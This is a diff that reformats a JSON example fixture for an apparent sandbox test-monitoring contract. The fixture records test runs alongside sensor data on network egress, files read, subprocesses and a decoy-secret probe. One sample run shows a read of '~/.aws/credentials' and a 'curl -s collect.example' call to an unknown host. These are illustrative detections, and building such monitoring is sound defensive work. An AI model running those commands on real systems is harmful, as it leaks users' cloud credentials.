@@ -15,22 +15,17 @@
     "file -- sandbox/tests/test_contract.py, apps/cujo and apps/web -- so a field",
     "added on one side and forgotten on another fails somewhere.",
     "",
-    "Every sensor here carries `armed` and `detail`, which is the maximal",
-    "shape and the reason this file is worth reading. The contract is looser",
-    "than the example in exactly one place: in the envelope's `sensors`",
-    "roll-up -- which a sub-agent writes by hand, unlike each runs[] entry,",
-    "which is verbatim from sniff.py -- `armed` is required and `detail` is",
-    "not. `armed` is the half `unarmedSensors` rules on; `detail` is prose a",
-    "reader can already find quoted in the runs below. See spec.md Contract 2."
+    "Every sensor here carries `armed` and `detail`, which is the maximal shape",
+    "and the reason this file is worth reading. The contract is looser than the",
+    "example in exactly one place: in the envelope's `sensors` roll-up, which a",
+    "sub-agent writes by hand rather than copying from `sniff.py`, `armed` is",
+    "required and `detail` is not. `armed` is the half `unarmedSensors` rules",
+    "on; `detail` is prose a reader can already find quoted in the runs below."
   ],
   "schema_version": 1,
   "check": "tests",
-  "base": {
-    "test_pricing.py::test_rounds_half_up": "pass"
-  },
-  "head": {
-    "test_pricing.py::test_rounds_half_up": "fail"
-  },
+  "base": { "test_pricing.py::test_rounds_half_up": "pass" },
+  "head": { "test_pricing.py::test_rounds_half_up": "fail" },
   "base_pass_head_fail": ["test_pricing.py::test_rounds_half_up"],
   "runs": [
     {
@@ -42,25 +37,10 @@
       "stdout_tail": "1 failed, 12 passed in 4.29s",
       "stderr_tail": "",
       "egress": [
-        {
-          "host": "pypi.org",
-          "port": 443,
-          "bytes": 3200,
-          "known": true
-        },
-        {
-          "host": "collect.example",
-          "port": 443,
-          "bytes": 512,
-          "known": false
-        }
+        { "host": "pypi.org", "port": 443, "bytes": 3200, "known": true },
+        { "host": "collect.example", "port": 443, "bytes": 512, "known": false }
       ],
-      "files_read": [
-        {
-          "path": "~/.aws/credentials",
-          "sensitive": true
-        }
-      ],
+      "files_read": [{ "path": "~/.aws/credentials", "sensitive": true }],
       "fs_changes": [
         {
           "path": "~/work/head/.pytest_cache/CACHEDIR.TAG",
@@ -75,32 +55,13 @@
           "sensitive": true
         }
       ],
-      "subprocesses": [
-        {
-          "argv": ["sh", "-c", "curl -s collect.example"]
-        }
-      ],
-      "secret_probe": {
-        "decoy_read": true,
-        "decoy_in_egress": null
-      },
+      "subprocesses": [{ "argv": ["sh", "-c", "curl -s collect.example"] }],
+      "secret_probe": { "decoy_read": true, "decoy_in_egress": null },
       "sensors": {
-        "proxy": {
-          "armed": true,
-          "detail": "port 8899"
-        },
-        "decoy": {
-          "armed": true,
-          "detail": "inotify"
-        },
-        "audit": {
-          "armed": true,
-          "detail": "184 rows"
-        },
-        "fs_diff": {
-          "armed": true,
-          "detail": "3181 paths"
-        }
+        "proxy": { "armed": true, "detail": "port 8899" },
+        "decoy": { "armed": true, "detail": "inotify" },
+        "audit": { "armed": true, "detail": "184 rows" },
+        "fs_diff": { "armed": true, "detail": "3181 paths" }
       },
       "truncated": {
         "stdout_tail": false,
@@ -129,27 +90,12 @@
       "files_read": [],
       "fs_changes": [],
       "subprocesses": [],
-      "secret_probe": {
-        "decoy_read": false,
-        "decoy_in_egress": null
-      },
+      "secret_probe": { "decoy_read": false, "decoy_in_egress": null },
       "sensors": {
-        "proxy": {
-          "armed": true,
-          "detail": "port 8899"
-        },
-        "decoy": {
-          "armed": false,
-          "detail": "inotify, no longer running"
-        },
-        "audit": {
-          "armed": false,
-          "detail": "no Python process ran"
-        },
-        "fs_diff": {
-          "armed": true,
-          "detail": "3184 paths"
-        }
+        "proxy": { "armed": true, "detail": "port 8899" },
+        "decoy": { "armed": false, "detail": "inotify, no longer running" },
+        "audit": { "armed": false, "detail": "no Python process ran" },
+        "fs_diff": { "armed": true, "detail": "3184 paths" }
       },
       "truncated": {
         "stdout_tail": false,
@@ -168,22 +114,10 @@
     }
   ],
   "sensors": {
-    "proxy": {
-      "armed": true,
-      "detail": "port 8899"
-    },
-    "decoy": {
-      "armed": false,
-      "detail": "inotify, no longer running"
-    },
-    "audit": {
-      "armed": false,
-      "detail": "no Python process ran"
-    },
-    "fs_diff": {
-      "armed": true,
-      "detail": "3184 paths"
-    }
+    "proxy": { "armed": true, "detail": "port 8899" },
+    "decoy": { "armed": false, "detail": "inotify, no longer running" },
+    "audit": { "armed": false, "detail": "no Python process ran" },
+    "fs_diff": { "armed": true, "detail": "3184 paths" }
   },
   "truncated": {
     "stdout_tail": false,
